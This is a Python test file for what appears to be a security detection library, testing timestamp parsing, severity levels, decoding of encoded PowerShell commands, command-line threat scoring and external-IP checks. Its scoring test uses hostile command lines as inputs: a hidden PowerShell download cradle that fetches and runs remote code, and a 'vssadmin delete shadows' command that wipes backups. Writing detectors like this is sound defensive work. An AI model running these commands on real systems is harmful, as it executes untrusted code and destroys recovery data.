from datetime import datetime, timedelta, timezone
from zoneinfo import ZoneInfo

import pytest

from vtl.detections import decode_powershell, is_external, score
from vtl.models import Severity, parse_iso


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("2026-09-29T10:42:11.1234567Z", datetime(2026, 9, 29, 10, 42, 11, 123456, timezone.utc)),
        ("2026-09-29T10:42:25.512+0000", datetime(2026, 9, 29, 10, 42, 25, 512000, timezone.utc)),
        ("2026-09-29T12:42:25+02:00", datetime(2026, 9, 29, 10, 42, 25, tzinfo=timezone.utc)),
        ("2026-09-29 10:42:25", datetime(2026, 9, 29, 10, 42, 25, tzinfo=timezone.utc)),
    ],
)
def test_parse_iso(raw, expected):
    assert parse_iso(raw) == expected


def test_parse_iso_naive_uses_default_tz():
    got = parse_iso("2026-09-29T12:00:00", default_tz=ZoneInfo("Europe/Berlin"))
    assert got == datetime(2026, 9, 29, 10, 0, tzinfo=timezone.utc)
    assert got.utcoffset() == timedelta(0)


def test_severity_parse():
    assert Severity.parse("High") is Severity.HIGH
    with pytest.raises(ValueError):
        Severity.parse("urgent")


def test_decode_powershell_variants():
    import base64

    blob = base64.b64encode("Write-Host pwned".encode("utf-16-le")).decode()
    for flag in ("-enc", "-EncodedCommand", "-e", "-ec", "/enc", "-EnCoDeD"):
        assert decode_powershell(f"powershell.exe -nop {flag} {blob}") == "Write-Host pwned"
    assert decode_powershell("powershell.exe -ExecutionPolicy Bypass -File a.ps1") is None
    assert decode_powershell("powershell.exe -enc notbase64!!") is None


def test_score_cmdline():
    v = score("powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://x')")
    assert v.severity is Severity.HIGH
    assert {"hidden window", "Invoke-Expression", "download cradle"} <= set(v.labels)
    assert score("notepad.exe report.txt").severity is Severity.INFO
    assert score("vssadmin delete shadows /all /quiet").severity is Severity.CRITICAL


def test_is_external():
    assert is_external("203.0.113.47")
    assert is_external("8.8.8.8")
    assert not is_external("10.1.2.3")
    assert not is_external("192.168.1.1")
    assert not is_external("fe80::1")
    assert not is_external("-")
